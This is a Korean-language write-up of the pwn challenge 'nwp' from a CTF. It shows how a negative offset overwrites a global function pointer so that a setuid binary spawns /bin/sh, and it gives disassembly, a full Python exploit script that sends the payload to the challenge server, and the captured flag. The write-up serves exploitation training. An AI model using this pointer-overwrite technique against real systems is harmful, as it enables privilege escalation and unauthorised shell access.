---
title: "[Hypersonic CTF] nwp Writeup"
date: 2026-06-09 00:00:00 +0900
categories: [ctf, pwn]
tags: [writeup, pwn]
ctf_event: "Hypersonic CTF (2026.06.07)"
challenge: "nwp"
challenge_category: pwn
toc: true
comments: false
---

## TL;DR

`offset` 입력값을 `-8`로 주면 `.bss`에 있는 함수 포인터를 덮을 수 있다.
그 함수 포인터를 권한을 맞춘 뒤 `/bin/sh`를 실행하는 내부 함수 `0x4014d8`로 바꾸고, 셸에서 `/flag.txt`를 읽으면 된다.

```text
flag: hs{https://clickjacking.me/}
```

## Challenge Info

```text
nc 13.209.205.230 1337
```

배포 파일:

```text
for_user/
├── Dockerfile
├── flag.txt
└── nwp
```

`Dockerfile`을 보면 `/nwp`가 setuid 바이너리로 실행된다.

```dockerfile
RUN chown ctf:ctf /flag.txt && chmod 400 /flag.txt && chattr +i /flag.txt
RUN chown ctf:ctf /nwp     && chmod 4755 /nwp

USER user
CMD ["socat", "-T300", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:/nwp,stderr"]
```

따라서 목표는 `/nwp`에서 `ctf` 권한을 유지한 채 `/flag.txt`를 읽는 것이다.

## Binary Overview

바이너리는 64-bit ELF이고 PIE가 꺼져 있어 코드 주소가 고정되어 있다.

```text
ELF type: ET_EXEC
NX: enabled
PIE: disabled
RELRO: disabled
Canary: not found
```

실행하면 두 번 입력을 받는다.

```text
offset> input>
```

문자열을 보면 `execve`, `setreuid`, `setregid`, `geteuid`, `getegid` 등이 존재한다. `/bin/sh`는 평문으로 박혀 있지 않고, 런타임에 디코딩된다.

## State Machine

`main`은 점프 테이블 기반 상태 머신처럼 동작한다. 정상 흐름에서는 다음 순서로 진행된다.

```text
7 -> init
3 -> DEBUG env check
5 -> function pointer init
4 -> offset 입력
8 -> input 8바이트 read
2 -> function pointer 호출
```

중요한 부분은 index 5에서 전역 함수 포인터가 초기화된다는 점이다.

```asm
0x401630: lea rax, [rip - 0x311]      ; rax = 0x401326
0x401637: mov qword ptr [rip+0x1f42], rax
```

저장되는 위치는 `0x403580`이다.

이후 index 2에서 해당 포인터가 호출된다.

```asm
0x401700: mov edi, 0
0x401705: call qword ptr [rip+0x1e75] ; call [0x403580]
```

즉, `0x403580`을 원하는 함수 주소로 덮으면 RIP를 간접 제어할 수 있다.

## Vulnerability

index 8에서 `offset`을 사용해 read 대상 주소를 계산한다.

```asm
0x4016b9: movsxd rsi, dword ptr [rsp+0xc] ; offset
0x4016be: lea rax, [rsi+8]
0x4016c2: mov edx, 0x48
0x4016c7: cmp rax, rdx
0x4016ca: cmovb rax, rdx
0x4016ce: sub rax, rsi
0x4016d1: lea rcx, [rax-8]
0x4016d5: add rsi, r12                  ; r12 = 0x403588
0x4016d8: mov edx, 8
0x4016dd: mov edi, 0
0x4016e2: call __read_chk
```

여기서 base는 `0x403588`이다.

```text
dest = 0x403588 + offset
read(0, dest, 8)
```

함수 포인터는 `0x403580`에 있으므로:

```text
0x403588 + offset = 0x403580
offset = -8
```

`offset = -8`을 입력하면 다음 8바이트 입력으로 함수 포인터를 덮을 수 있다.

## Useful Function

`0x4014d8` 함수는 setuid 바이너리에서 필요한 권한을 맞춘 뒤 `/bin/sh`를 실행한다.

```asm
0x4014d8:
  geteuid()
  geteuid()
  setreuid(euid, euid)
  getegid()
  getegid()
  setregid(egid, egid)
  execve("/bin/sh", ["/bin/sh", NULL], NULL)
```

따라서 함수 포인터 `0x403580`을 `0x4014d8`로 덮으면 셸을 얻는다.

## Exploit

```python
import socket
import struct

HOST = "13.209.205.230"
PORT = 1337

p64 = lambda x: struct.pack("<Q", x)

payload  = b"-8\n"
payload += p64(0x4014d8)
payload += b"cat /flag.txt\n"
payload += b"exit\n"

s = socket.create_connection((HOST, PORT))
s.sendall(payload)

data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

print(data.decode("latin-1", errors="replace"))
```

## Result

```text
$ python3 solve.py
offset> input> hs{https://clickjacking.me/}
```

## Takeaway

겉으로는 `__read_chk`를 사용해서 안전해 보이지만, destination 계산에 음수 offset을 허용해서 base 앞쪽의 전역 함수 포인터를 덮을 수 있었다. PIE가 꺼져 있어 내부 셸 실행 함수 주소도 고정이었고, 한 번의 8바이트 write만으로 exploit이 끝났다.
